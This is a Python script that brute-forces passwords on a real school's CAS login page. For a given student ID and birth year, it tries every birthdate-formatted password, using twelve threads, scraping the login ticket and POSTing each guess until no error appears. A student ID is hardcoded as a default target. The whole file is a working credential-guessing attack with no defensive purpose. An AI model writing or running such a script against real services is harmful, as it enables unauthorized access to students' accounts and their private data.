import requests
import os
import time
from bs4 import BeautifulSoup
import threading
import sys

f = 0


def crack(id, user, y, m1, m2, d1, d2):
    url = 'http://bdfz-cas.pkuschool.edu.cn/cas/login'
    # http://1.1.1.2/ac_portal/default/pc.html?template=default&tabs=pwd&vlanid=0&_ID_=0&url=&pop=0&type=logout&username=f0000l0052
    global f
    for i in range(m1, m2 + 1):
        if (f):
            break
        print("[Crashing]: Year: %4d, " % y, "Month: %2d" % i)
        for j in range(d1, d2 + 1):
            if (f):
                break
            pwd = "%04d%02d%02d" % (y, i, j)
            r = requests.get(url=url)
            r = BeautifulSoup(r.text, 'lxml')
            lt = r.select('input[id="lt"]')
            lt = ("%s" % (lt))
            lt = lt[47:-4]
            data = {
                "lt": lt,
                "service": "",
                "username": user,
                "password": pwd
            }
            r = requests.request("POST", url=url, data=data)
            r = BeautifulSoup(r.text, 'lxml')
            status = r.select('div[class="alert alert-danger"]')
            if (status == []):
                print("[Success]: Password Found!  Username:", user, "Password:", pwd)
                f = 1
                break
    if (f):
        sys.exit()


user = "2523212"
year = 2006

import argparse

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("id")
    parser.add_argument("year")
    args = parser.parse_args()
    print("Crashing at:", args.id)
    user = args.id
    year = int(args.year)
    thread_list = []
    for i in range(1, 13):
        thread = threading.Thread(target=crack, args=(i, user, year, i, i, 1, 31))
        thread_list.append(thread)

    for t in thread_list:
        t.setDaemon(True)  # 设置为守护线程，不会因主线程结束而中断
        t.start()
    for t in thread_list:
        t.join()

    if not f:
        print("[Failed]: Password Not Match. You May try year: %d or %d" % (year - 1, year + 1))
        res = input("retry most common year? [Y/n]")
        if res not in ["N", "n", "No", "no"]:
            f = 0
            thread_list = []
            for i in range(1, 13):
                thread = threading.Thread(target=crack, args=(i, user, year - 1, i, i, 1, 31))
                thread_list.append(thread)

            for t in thread_list:
                t.setDaemon(True)  # 设置为守护线程，不会因主线程结束而中断
                t.start()
            for t in thread_list:
                t.join()

            if not f:
                print("[Failed]: Crash Failed")
